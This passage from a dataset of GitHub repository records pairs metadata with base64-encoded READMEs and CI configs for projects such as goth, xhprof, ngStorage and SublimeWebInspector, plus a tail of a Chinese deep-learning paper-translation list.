RTclODklODgvKQpb5Lit6Iux5paH5a+554WnXShodHRwOi8vbm9haHNuYWls
LmNvbS8yMDE3LzEyLzExLzIwMTctMTItMTEtU2luZ2xlJTIwU2hvdCUyME11
bHRpQm94JTIwRGV0ZWN0b3IlRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIl
RTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQlQjglQUQlRTglOEIlQjEl
RTYlOTYlODclRTUlQUYlQjklRTclODUlQTcvKQoKKiBZT0xPOTAwMCAgCltZ
T0xPOTAwMDogQmV0dGVyLCBGYXN0ZXIsIFN0cm9uZ2VyXShodHRwczovL2Fy
eGl2Lm9yZy9hYnMvMTYxMi4wODI0MikKW+S4reaWh+eJiF0oaHR0cDovL25v
YWhzbmFpbC5jb20vMjAxNy8xMi8yNi8yMDE3LTEyLTI2LVlPTE85MDAwLCUy
MEJldHRlciwlMjBGYXN0ZXIsJTIwU3Ryb25nZXIlRTglQUUlQkElRTYlOTYl
ODclRTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQlQjgl
QUQlRTYlOTYlODclRTclODklODgvKQpb5Lit6Iux5paH5a+554WnXShodHRw
Oi8vbm9haHNuYWlsLmNvbS8yMDE3LzEyLzI2LzIwMTctMTItMjYtWU9MTzkw
MDAsJTIwQmV0dGVyLCUyMEZhc3RlciwlMjBTdHJvbmdlciVFOCVBRSVCQSVF
NiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5NCVFMiU4MCU5NCVF
NCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4NyVFNSVBRiVCOSVFNyU4NSVBNy8p
CgoqIERlZm9ybWFibGUtQ29udk5ldHMgIApbRGVmb3JtYWJsZSBDb252b2x1
dGlvbmFsIE5ldHdvcmtzXShodHRwczovL2FyeGl2Lm9yZy9hYnMvMTcwMy4w
NjIxMSkKW+S4reaWh+eJiF0oaHR0cDovL25vYWhzbmFpbC5jb20vMjAxNy8x
MS8yOS8yMDE3LTExLTI5LURlZm9ybWFibGUlMjBDb252b2x1dGlvbmFsJTIw
TmV0d29ya3MlRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIlRTglQUYlOTEl
RTIlODAlOTQlRTIlODAlOTQlRTQlQjglQUQlRTYlOTYlODclRTclODklODgv
KQpb5Lit6Iux5paH5a+554WnXShodHRwOi8vbm9haHNuYWlsLmNvbS8yMDE3
LzExLzI5LzIwMTctMTEtMjktRGVmb3JtYWJsZSUyMENvbnZvbHV0aW9uYWwl
MjBOZXR3b3JrcyVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5
MSVFMiU4MCU5NCVFMiU4MCU5NCVFNCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4
NyVFNSVBRiVCOSVFNyU4NSVBNy8pCgoqIEZhc3RlciBSLUNOTiAgCltGYXN0
ZXIgUi1DTk46IFRvd2FyZHMgUmVhbC1UaW1lIE9iamVjdCBEZXRlY3Rpb24g
d2l0aCBSZWdpb24gUHJvcG9zYWwgTmV0d29ya3NdKGh0dHBzOi8vYXJ4aXYu
b3JnL2Ficy8xNTA2LjAxNDk3KQpb5Lit5paH54mIXShodHRwOi8vbm9haHNu
YWlsLmNvbS8yMDE4LzAxLzAzLzIwMTgtMDEtMDMtRmFzdGVyJTIwUi1DTk4l
RTglQUUlQkElRTYlOTYlODclRTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQl
RTIlODAlOTQlRTQlQjglQUQlRTYlOTYlODclRTclODklODgvKQpb5Lit6Iux
5paH5a+554WnXShodHRwOi8vbm9haHNuYWlsLmNvbS8yMDE4LzAxLzAzLzIw
MTgtMDEtMDMtRmFzdGVyJTIwUi1DTk4lRTglQUUlQkElRTYlOTYlODclRTcl
QkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQlQjglQUQlRTgl
OEIlQjElRTYlOTYlODclRTUlQUYlQjklRTclODUlQTcvKQoKKiBSLUZDTiAg
CltSLUZDTjogT2JqZWN0IERldGVjdGlvbiB2aWEgUmVnaW9uLWJhc2VkIEZ1
bGx5IENvbnZvbHV0aW9uYWwgTmV0d29ya3NdKGh0dHBzOi8vYXJ4aXYub3Jn
L2Ficy8xNjA1LjA2NDA5KQpb5Lit5paH54mIXShodHRwOi8vbm9haHNuYWls
LmNvbS8yMDE4LzAxLzIyLzIwMTgtMDEtMjItUi1GQ04lRTglQUUlQkElRTYl
OTYlODclRTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQl
QjglQUQlRTYlOTYlODclRTclODklODgvKQpb5Lit6Iux5paH5a+554WnXSho
dHRwOi8vbm9haHNuYWlsLmNvbS8yMDE4LzAxLzIyLzIwMTgtMDEtMjItUi1G
Q04lRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIlRTglQUYlOTElRTIlODAl
OTQlRTIlODAlOTQlRTQlQjglQUQlRTglOEIlQjElRTYlOTYlODclRTUlQUYl
QjklRTclODUlQTcvKQoKKiBGUE4gIApbRmVhdHVyZSBQeXJhbWlkIE5ldHdv
cmtzIGZvciBPYmplY3QgRGV0ZWN0aW9uXShodHRwczovL2FyeGl2Lm9yZy9h
YnMvMTYxMi4wMzE0NCkKW+S4reaWh+eJiF0oaHR0cDovL25vYWhzbmFpbC5j
b20vMjAxOC8wMy8yMC8yMDE4LTAzLTIwLUZlYXR1cmUlMjBQeXJhbWlkJTIw
TmV0d29ya3MlMjBmb3IlMjBPYmplY3QlMjBEZXRlY3Rpb24lRTglQUUlQkEl
RTYlOTYlODclRTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQl
RTQlQjglQUQlRTYlOTYlODclRTclODklODgvKQpb5Lit6Iux5paH5a+554Wn
XShodHRwOi8vbm9haHNuYWlsLmNvbS8yMDE4LzAzLzIwLzIwMTgtMDMtMjAt
RmVhdHVyZSUyMFB5cmFtaWQlMjBOZXR3b3JrcyUyMGZvciUyME9iamVjdCUy
MERldGVjdGlvbiVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5
MSVFMiU4MCU5NCVFMiU4MCU5NCVFNCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4
NyVFNSVBRiVCOSVFNyU4NSVBNy8pCgojIyBPQ1IKCiogQ1JOTiAgCltBbiBF
bmQtdG8tRW5kIFRyYWluYWJsZSBOZXVyYWwgTmV0d29yayBmb3IgSW1hZ2Ut
YmFzZWQgU2VxdWVuY2UgUmVjb2duaXRpb24gYW5kIEl0cyBBcHBsaWNhdGlv
biB0byBTY2VuZSBUZXh0IFJlY29nbml0aW9uXShodHRwczovL2FyeGl2Lm9y
Zy9hYnMvMTUwNy4wNTcxNykKW+S4reaWh+eJiF0oaHR0cDovL25vYWhzbmFp
bC5jb20vMjAxNy8wOC8yMS8yMDE3LTA4LTIxLUNSTk4lRTglQUUlQkElRTYl
OTYlODclRTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQl
QjglQUQlRTYlOTYlODclRTclODklODgvKQpb5Lit6Iux5paH5a+554WnXSho
dHRwOi8vbm9haHNuYWlsLmNvbS8yMDE3LzA4LzIxLzIwMTctMDgtMjEtQ1JO
TiVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5
NCVFMiU4MCU5NCVFNCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4NyVFNSVBRiVC
OSVFNyU4NSVBNy8pCgoqIENUUE4gIApbRGV0ZWN0aW5nIFRleHQgaW4gTmF0
dXJhbCBJbWFnZSB3aXRoIENvbm5lY3Rpb25pc3QgVGV4dCBQcm9wb3NhbCBO
ZXR3b3JrXShodHRwczovL2FyeGl2Lm9yZy9hYnMvMTYwOS4wMzYwNSkKW+S4
reaWh+eJiF0oaHR0cDovL25vYWhzbmFpbC5jb20vMjAxOC8wMi8wMi8yMDE4
LTAyLTAyLURldGVjdGluZyUyMFRleHQlMjBpbiUyME5hdHVyYWwlMjBJbWFn
ZSUyMHdpdGglMjBDb25uZWN0aW9uaXN0JTIwVGV4dCUyMFByb3Bvc2FsJTIw
TmV0d29yayVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVF
MiU4MCU5NCVFMiU4MCU5NCVFNCVCOCVBRCVFNiU5NiU4NyVFNyU4OSU4OC8p
ClvkuK3oi7Hmloflr7nnhaddKGh0dHA6Ly9ub2Foc25haWwuY29tLzIwMTgv
MDIvMDIvMjAxOC0wMi0wMi1EZXRlY3RpbmclMjBUZXh0JTIwaW4lMjBOYXR1
cmFsJTIwSW1hZ2UlMjB3aXRoJTIwQ29ubmVjdGlvbmlzdCUyMFRleHQlMjBQ
cm9wb3NhbCUyME5ldHdvcmslRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIl
RTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQlQjglQUQlRTglOEIlQjEl
RTYlOTYlODclRTUlQUYlQjklRTclODUlQTcvKQoKIyMgTW9iaWxlCgoqIE1v
YmlsZU5ldFYyICAKW01vYmlsZU5ldFYyOiBJbnZlcnRlZCBSZXNpZHVhbHMg
YW5kIExpbmVhciBCb3R0bGVuZWNrc10oaHR0cHM6Ly9hcnhpdi5vcmcvYWJz
LzE4MDEuMDQzODEpClvkuK3mlofniYhdKGh0dHA6Ly9ub2Foc25haWwuY29t
LzIwMTgvMDYvMDYvMjAxOC0wNi0wNi1Nb2JpbGVOZXRWMi0lMjBJbnZlcnRl
ZCUyMFJlc2lkdWFscyUyMGFuZCUyMExpbmVhciUyMEJvdHRsZW5lY2tzJUU4
JUFFJUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4JUFGJTkxJUUyJTgwJTk0JUUy
JTgwJTk0JUU0JUI4JUFEJUU2JTk2JTg3JUU3JTg5JTg4LykKW+S4reiLseaW
h+WvueeFp10oaHR0cDovL25vYWhzbmFpbC5jb20vMjAxOC8wNi8wNi8yMDE4
LTA2LTA2LU1vYmlsZU5ldFYyLSUyMEludmVydGVkJTIwUmVzaWR1YWxzJTIw
YW5kJTIwTGluZWFyJTIwQm90dGxlbmVja3MlRTglQUUlQkElRTYlOTYlODcl
RTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQlQjglQUQl
RTglOEIlQjElRTYlOTYlODclRTUlQUYlQjklRTclODUlQTcvKQoKPCEtLQoK
IyMgUmV3YXJkCgpXaWxsIGFueW9uZSBmaW5kIHRoaXM/CgoqIFdlY2hhdCAg
Cgo8aW1nIHdpZHRoPSIyNzUiIGFsdD0i5b6u5L+hIiBzcmM9Imh0dHBzOi8v
dXNlci1pbWFnZXMuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxMzExNDQyLzQ0
NDQ3NjcxLTdhM2RkMzAwLWE2MWItMTFlOC04OGNiLWQ4MTVhY2I2N2M1ZS5w
bmciPiAKCiogQWxpcGF5ICAKCjxpbWcgd2lkdGg9IjI3NSIgYWx0PSLmlK/k
u5jlrp0iIHNyYz0iaHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29u
dGVudC5jb20vMjEzMTE0NDIvNDQ0NDc3ODAtY2VlMTRlMDAtYTYxYi0xMWU4
LTg1MzgtNzAzOThmODRjNTNhLnBuZyI+CgotLT4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SublimeWebInspector',7683794,b'Web Inspector allow you debug Javascript right in the editor',b'Python',20,2397,,2397,False,b'https://api.github.com/repos/sokolovstas/SublimeWebInspector/forks',"W1NlZSBSZWFkbWUgaW4gbWFzdGVyIGJyYW5jaF0oaHR0cDovL2dpdGh1Yi5j
b20vc29rb2xvdnN0YXMvU3VibGltZVdlYkluc3BlY3Rvci90cmVlL21hc3Rl
cikKCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'goth',25225549,"b'Package goth provides a simple, clean, and idiomatic way to write authentication packages for Go web applications.'",b'Go',30,2397,,2397,False,b'https://api.github.com/repos/markbates/goth/forks',"IyBHb3RoOiBNdWx0aS1Qcm92aWRlciBBdXRoZW50aWNhdGlvbiBmb3IgR28g
WyFbR29Eb2NdKGh0dHBzOi8vZ29kb2Mub3JnL2dpdGh1Yi5jb20vbWFya2Jh
dGVzL2dvdGg/c3RhdHVzLnN2ZyldKGh0dHBzOi8vZ29kb2Mub3JnL2dpdGh1
Yi5jb20vbWFya2JhdGVzL2dvdGgpIFshW0J1aWxkIFN0YXR1c10oaHR0cHM6
Ly90cmF2aXMtY2kub3JnL21hcmtiYXRlcy9nb3RoLnN2ZyldKGh0dHBzOi8v
dHJhdmlzLWNpLm9yZy9tYXJrYmF0ZXMvZ290aCkKClBhY2thZ2UgZ290aCBw
cm92aWRlcyBhIHNpbXBsZSwgY2xlYW4sIGFuZCBpZGlvbWF0aWMgd2F5IHRv
IHdyaXRlIGF1dGhlbnRpY2F0aW9uCnBhY2thZ2VzIGZvciBHbyB3ZWIgYXBw
bGljYXRpb25zLgoKVW5saWtlIG90aGVyIHNpbWlsYXIgcGFja2FnZXMsIEdv
dGgsIGxldHMgeW91IHdyaXRlIE9BdXRoLCBPQXV0aDIsIG9yIGFueSBvdGhl
cgpwcm90b2NvbCBwcm92aWRlcnMsIGFzIGxvbmcgYXMgdGhleSBpbXBsZW1l
bnQgdGhlIGBQcm92aWRlcmAgYW5kIGBTZXNzaW9uYCBpbnRlcmZhY2VzLgoK
VGhpcyBwYWNrYWdlIHdhcyBpbnNwaXJlZCBieSBbaHR0cHM6Ly9naXRodWIu
Y29tL2ludHJpZGVhL29tbmlhdXRoXShodHRwczovL2dpdGh1Yi5jb20vaW50
cmlkZWEvb21uaWF1dGgpLgoKIyMgSW5zdGFsbGF0aW9uCgpgYGB0ZXh0CiQg
Z28gZ2V0IGdpdGh1Yi5jb20vbWFya2JhdGVzL2dvdGgKYGBgCgojIyBTdXBw
b3J0ZWQgUHJvdmlkZXJzCgoqIEFtYXpvbgoqIEFwcGxlCiogQXV0aDAKKiBB
enVyZSBBRAoqIEJhdHRsZS5uZXQKKiBCaXRidWNrZXQKKiBCb3gKKiBDbG91
ZCBGb3VuZHJ5CiogRGFpbHltb3Rpb24KKiBEZWV6ZXIKKiBEaWdpdGFsIE9j
ZWFuCiogRGlzY29yZAoqIERyb3Bib3gKKiBFdmUgT25saW5lCiogRmFjZWJv
b2sKKiBGaXRiaXQKKiBHaXRlYQoqIEdpdEh1YgoqIEdpdGxhYgoqIEdvb2ds
ZQoqIEdvb2dsZSsgKGRlcHJlY2F0ZWQpCiogSGVyb2t1CiogSW5mbHV4Q2xv
dWQKKiBJbnN0YWdyYW0KKiBJbnRlcmNvbQoqIExhc3RmbQoqIExpbmtlZGlu
CiogTElORQoqIE1haWxydQoqIE1lZXR1cAoqIE1pY3Jvc29mdE9ubGluZQoq
IE5hdmVyCiogTmV4dGNsb3VkCiogT25lRHJpdmUKKiBPcGVuSUQgQ29ubmVj
dCAoYXV0byBkaXNjb3ZlcnkpCiogUGF5cGFsCiogU2FsZXNGb3JjZQoqIFNo
b3BpZnkKKiBTbGFjawoqIFNvdW5kY2xvdWQKKiBTcG90aWZ5CiogU3RlYW0K
KiBTdHJpcGUKKiBUdW1ibHIKKiBUd2l0Y2gKKiBUd2l0dGVyCiogVHlwZXRh
bGsKKiBVYmVyCiogVksKKiBXZXBheQoqIFhlcm8KKiBZYWhvbwoqIFlhbW1l
cgoqIFlhbmRleAoKIyMgRXhhbXBsZXMKClNlZSB0aGUgW2V4YW1wbGVzXShl
eGFtcGxlcykgZm9sZGVyIGZvciBhIHdvcmtpbmcgYXBwbGljYXRpb24gdGhh
dCBsZXRzIHVzZXJzIGF1dGhlbnRpY2F0ZQp0aHJvdWdoIFR3aXR0ZXIsIEZh
Y2Vib29rLCBHb29nbGUgUGx1cyBldGMuCgpUbyBydW4gdGhlIGV4YW1wbGUg
ZWl0aGVyIGNsb25lIHRoZSBzb3VyY2UgZnJvbSBHaXRIdWIKCmBgYHRleHQK
JCBnaXQgY2xvbmUgZ2l0QGdpdGh1Yi5jb206bWFya2JhdGVzL2dvdGguZ2l0
CmBgYApvciB1c2UKYGBgdGV4dAokIGdvIGdldCBnaXRodWIuY29tL21hcmti
YXRlcy9nb3RoCmBgYApgYGB0ZXh0CiQgY2QgZ290aC9leGFtcGxlcwokIGdv
IGdldCAtdgokIGdvIGJ1aWxkCiQgLi9leGFtcGxlcwpgYGAKCk5vdyBvcGVu
IHVwIHlvdXIgYnJvd3NlciBhbmQgZ28gdG8gW2h0dHA6Ly9sb2NhbGhvc3Q6
MzAwMF0oaHR0cDovL2xvY2FsaG9zdDozMDAwKSB0byBzZWUgdGhlIGV4YW1w
bGUuCgpUbyBhY3R1YWxseSB1c2UgdGhlIGRpZmZlcmVudCBwcm92aWRlcnMs
IHBsZWFzZSBtYWtlIHN1cmUgeW91IHNldCBlbnZpcm9ubWVudCB2YXJpYWJs
ZXMuIEV4YW1wbGUgZ2l2ZW4gaW4gdGhlIGV4YW1wbGVzL21haW4uZ28gZmls
ZQoKIyMgU2VjdXJpdHkgTm90ZXMKCkJ5IGRlZmF1bHQsIGdvdGhpYyB1c2Vz
IGEgYENvb2tpZVN0b3JlYCBmcm9tIHRoZSBgZ29yaWxsYS9zZXNzaW9uc2Ag
cGFja2FnZSB0byBzdG9yZSBzZXNzaW9uIGRhdGEuCgpBcyBjb25maWd1cmVk
LCB0aGlzIGRlZmF1bHQgc3RvcmUgKGBnb3RoaWMuU3RvcmVgKSB3aWxsIGdl
bmVyYXRlIGNvb2tpZXMgd2l0aCBgT3B0aW9uc2A6CgpgYGBnbwomT3B0aW9u
c3sKICAgUGF0aDogICAiLyIsCiAgIERvbWFpbjogIiIsCiAgIE1heEFnZTog
ODY0MDAgKiAzMCwKICAgSHR0cE9ubHk6IHRydWUsCiAgIFNlY3VyZTogZmFs
c2UsCiB9CmBgYAoKVG8gdGFpbG9yIHRoZXNlIGZpZWxkcyBmb3IgeW91ciBh
cHBsaWNhdGlvbiwgeW91IGNhbiBvdmVycmlkZSB0aGUgYGdvdGhpYy5TdG9y
ZWAgdmFyaWFibGUgYXQgc3RhcnR1cC4KClRoZSBmb2xsb3dpbmcgc25pcHBl
dCBzaG93cyBvbmUgd2F5IHRvIGRvIHRoaXM6CgpgYGBnbwprZXkgOj0gIiIg
ICAgICAgICAgICAgLy8gUmVwbGFjZSB3aXRoIHlvdXIgU0VTU0lPTl9TRUNS
RVQgb3Igc2ltaWxhcgptYXhBZ2UgOj0gODY0MDAgKiAzMCAgLy8gMzAgZGF5
cwppc1Byb2QgOj0gZmFsc2UgICAgICAgLy8gU2V0IHRvIHRydWUgd2hlbiBz
ZXJ2aW5nIG92ZXIgaHR0cHMKCnN0b3JlIDo9IHNlc3Npb25zLk5ld0Nvb2tp
ZVN0b3JlKFtdYnl0ZShrZXkpKQpzdG9yZS5NYXhBZ2UobWF4QWdlKQpzdG9y
ZS5PcHRpb25zLlBhdGggPSAiLyIKc3RvcmUuT3B0aW9ucy5IdHRwT25seSA9
IHRydWUgICAvLyBIdHRwT25seSBzaG91bGQgYWx3YXlzIGJlIGVuYWJsZWQK
c3RvcmUuT3B0aW9ucy5TZWN1cmUgPSBpc1Byb2QKCmdvdGhpYy5TdG9yZSA9
IHN0b3JlCmBgYAoKIyMgSXNzdWVzCgpJc3N1ZXMgYWx3YXlzIHN0YW5kIGEg
c2lnbmlmaWNhbnRseSBiZXR0ZXIgY2hhbmNlIG9mIGdldHRpbmcgZml4ZWQg
aWYgdGhleSBhcmUgYWNjb21wYW5pZWQgYnkgYQpwdWxsIHJlcXVlc3QuCgoj
IyBDb250cmlidXRpbmcKCldvdWxkIEkgbG92ZSB0byBzZWUgbW9yZSBwcm92
aWRlcnM/IENlcnRhaW5seSEgV291bGQgeW91IGxvdmUgdG8gY29udHJpYnV0
ZSBvbmU/IEhvcGVmdWxseSwgeWVzIQoKMS4gRm9yayBpdAoyLiBDcmVhdGUg
eW91ciBmZWF0dXJlIGJyYW5jaCAoZ2l0IGNoZWNrb3V0IC1iIG15LW5ldy1m
ZWF0dXJlKQozLiBXcml0ZSBUZXN0cyEKNC4gQ29tbWl0IHlvdXIgY2hhbmdl
cyAoZ2l0IGNvbW1pdCAtYW0gJ0FkZCBzb21lIGZlYXR1cmUnKQo1LiBQdXNo
IHRvIHRoZSBicmFuY2ggKGdpdCBwdXNoIG9yaWdpbiBteS1uZXctZmVhdHVy
ZSkKNi4gQ3JlYXRlIG5ldyBQdWxsIFJlcXVlc3QK
",,"bGFuZ3VhZ2U6IGdvCgpzdWRvOiBmYWxzZQoKZ286CiAgLSAiMS45IgogIC0g
IjEuMTAiCiAgLSAiMS4xMSIKICAtICIxLjEyIgogIC0gdGlwCgptYXRyaXg6
CiAgYWxsb3dfZmFpbHVyZXM6CiAgICAtIGdvOiAndGlwJwoK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'xhprof',165894,b'XHProf is a function-level hierarchical profiler for PHP and has a simple HTML based user interface.',b'PHP',36,2396,,2396,False,b'https://api.github.com/repos/phacility/xhprof/forks',"Rm9yIGluc3RhbGxhdGlvbiBhbmQgdXNhZ2Ugbm90ZXMgcmVmZXIgdG86CiAg
IHhocHJvZl9odG1sL2RvY3MvaW5kZXguaHRtbAoKVG8gdmlldyB0aGUgbGF0
ZXN0IHZlcnNpb24gb2YgdGhlIGRvYywgZ28gdG86CiAgaHR0cDovL3BlY2wu
cGhwLm5ldC9wYWNrYWdlL3hocHJvZiAtLS0+IFtWaWV3IERvY3VtZW50YXRp
b25dCg==
",,"bGFuZ3VhZ2U6IHBocAoKbm90aWZpY2F0aW9uczoKICBlbWFpbDogZmFsc2UK
CnBocDoKICAtIDUuNQogIC0gNS40CiAgLSA1LjMKICAtIDUuMy4zCgplbnY6
CiAgZ2xvYmFsOgogICAgLSBURVNUX1BIUF9BUkdTPSItcSIKICAgIC0gUkVQ
T1JUX0VYSVRfU1RBVFVTPTEKCmJlZm9yZV9zY3JpcHQ6CiAgLSBjZCBleHRl
bnNpb24KICAtIHBocGl6ZQogIC0gLi9jb25maWd1cmUKICAtIG1ha2UgLWo0
CgpzY3JpcHQ6IG1ha2UgLWYgTWFrZWZpbGUubG9jYWwgdGVzdF93aXRoX2V4
aXRfc3RhdHVzCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'ngStorage',11212142,b'localStorage and sessionStorage done right for AngularJS.',b'JavaScript',77,2396,,2396,False,b'https://api.github.com/repos/gsklee/ngStorage/forks',"bmdTdG9yYWdlCj09PT09PT09PQoKWyFbQnVpbGQgU3RhdHVzXShodHRwczov
L3RyYXZpcy1jaS5vcmcvZ3NrbGVlL25nU3RvcmFnZS5zdmcpXShodHRwczov
L3RyYXZpcy1jaS5vcmcvZ3NrbGVlL25nU3RvcmFnZSkKWyFbRGVwZW5kZW5j
eSBTdGF0dXNdKGh0dHBzOi8vZGF2aWQtZG0ub3JnL2dza2xlZS9uZ1N0b3Jh
Z2Uuc3ZnKV0oaHR0cHM6Ly9kYXZpZC1kbS5vcmcvZ3NrbGVlL25nU3RvcmFn
ZSkKWyFbZGV2RGVwZW5kZW5jeSBTdGF0dXNdKGh0dHBzOi8vZGF2aWQtZG0u
b3JnL2dza2xlZS9uZ1N0b3JhZ2UvZGV2LXN0YXR1cy5zdmcpXShodHRwczov
L2RhdmlkLWRtLm9yZy9nc2tsZWUvbmdTdG9yYWdlI2luZm89ZGV2RGVwZW5k
ZW5jaWVzKQoKQW4gW0FuZ3VsYXJKU10oaHR0cHM6Ly9naXRodWIuY29tL2Fu
Z3VsYXIvYW5ndWxhci5qcykgbW9kdWxlIHRoYXQgbWFrZXMgV2ViIFN0b3Jh
Z2Ugd29ya2luZyBpbiB0aGUgKkFuZ3VsYXIgV2F5Ki4gQ29udGFpbnMgdHdv
IHNlcnZpY2VzOiBgJGxvY2FsU3RvcmFnZWAgYW5kIGAkc2Vzc2lvblN0b3Jh
Z2VgLgoKIyMjIERpZmZlcmVuY2VzIHdpdGggT3RoZXIgSW1wbGVtZW50YXRp
b25zCgoqICoqTm8gR2V0dGVyICduJyBTZXR0ZXIgQnVsbHNoaXQqKiAtIFJp
Z2h0IGZyb20gQW5ndWxhckpTIGhvbWVwYWdlOiAiVW5saWtlIG90aGVyIGZy
YW1ld29ya3MsIHRoZXJlIGlzIG5vIG5lZWQgdG8gWy4uLl0gd3JhcCB0aGUg
bW9kZWwgaW4gYWNjZXNzb3JzIG1ldGhvZHMuIEp1c3QgcGxhaW4gb2xkIEph
dmFTY3JpcHQgaGVyZS4iIE5vdyB5b3UgY2FuIGVuam95IHRoZSBzYW1lIGJl
bmVmaXQgd2hpbGUgYWNoaWV2aW5nIGRhdGEgcGVyc2lzdGVuY2Ugd2l0aCBX
ZWIgU3RvcmFnZS4KCiogKipzZXNzaW9uU3RvcmFnZSoqIC0gV2UgZ290IHRo
aXMgb2Z0ZW4tb3Zlcmxvb2tlZCBidWRkeSBjb3ZlcmVkLgoKKiAqKkNsZWFu
bHktQXV0aG9yZWQgQ29kZSoqIC0gV3JpdHRlbiBpbiB0aGUgKkFuZ3VsYXIg
V2F5Kiwgd2VsbC1zdHJ1Y3R1cmVkIHdpdGggdGVzdGFiaWxpdHkgaW4gbWlu
ZC4KCiogKipObyBDb29raWUgRmFsbGJhY2sqKiAtIFdpdGggV2ViIFN0b3Jh
Z2UgYmVpbmcgW3JlYWRpbHkgYXZhaWxhYmxlXShodHRwOi8vY2FuaXVzZS5j
b20vbmFtZXZhbHVlLXN0b3JhZ2UpIGluIFthbGwgdGhlIGJyb3dzZXJzIEFu
Z3VsYXJKUyBvZmZpY2lhbGx5IHN1cHBvcnRzXShodHRwOi8vZG9jcy5hbmd1
bGFyanMub3JnL21pc2MvZmFxI2Nhbmlkb3dubG9hZHRoZXNvdXJjZWJ1aWxk
YW5kaG9zdHRoZWFuZ3VsYXJqc2Vudmlyb25tZW50bG9jYWxseSksIHN1Y2gg
ZmFsbGJhY2sgaXMgbGFyZ2VseSByZWR1bmRhbnQuCgpJbnN0YWxsCj09PT09
PT0KCiMjIyBCb3dlcgoKYGBgYmFzaApib3dlciBpbnN0YWxsIG5nc3RvcmFn
ZQpgYGAKCipOT1RFOiogV2UgYXJlIGBuZ3N0b3JhZ2VgIGFuZCAqTk9UKiBg
bmdTdG9yYWdlYC4gVGhlIGNhc2luZyBpcyBpbXBvcnRhbnQhCgojIyMgTlBN
CmBgYGJhc2gKbnBtIGluc3RhbGwgbmdzdG9yYWdlCmBgYAoKKk5PVEU6KiBX
ZSBhcmUgYG5nc3RvcmFnZWAgYW5kICpOT1QqIGBuZ1N0b3JhZ2VgLiBUaGUg
Y2FzaW5nIGlzIGltcG9ydGFudCEKCiMjIyBudWdldAoKYGBgYmFzaApJbnN0
YWxsLVBhY2thZ2UgZ3NrbGVlLm5nU3RvcmFnZQpgYGAKCk9yIHNlYXJjaCBm
b3IgYEFuZ3VsYXIgbmdTdG9yYWdlYCBpbiB0aGUgbnVnZXQgcGFja2FnZSBt
YW5hZ2VyLiA8aHR0cHM6Ly93d3cubnVnZXQub3JnL3BhY2thZ2VzL2dza2xl
ZS5uZ1N0b3JhZ2U+CgpDRE4KPT09CgojIyMgY2RuanMKY2RuanMgbm93IGhv
c3RzIG5nU3RvcmFnZSBhdCA8aHR0cHM6Ly9jZG5qcy5jb20vbGlicmFyaWVz
L25nU3RvcmFnZT4KClRvIHVzZSBpdAoKYGBgIGh0bWwKPHNjcmlwdCBzcmM9
Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL25nU3Rv
cmFnZS8wLjMuMTAvbmdTdG9yYWdlLm1pbi5qcyI+PC9zY3JpcHQ+CmBgYAoK
IyMjIGpzRGVsaXZyCgpqc0RlbGl2ciBob3N0cyBuZ1N0b3JhZ2UgYXQgPGh0
dHA6Ly93d3cuanNkZWxpdnIuY29tLyMhbmdzdG9yYWdlPgoKVG8gdXNlIGlz
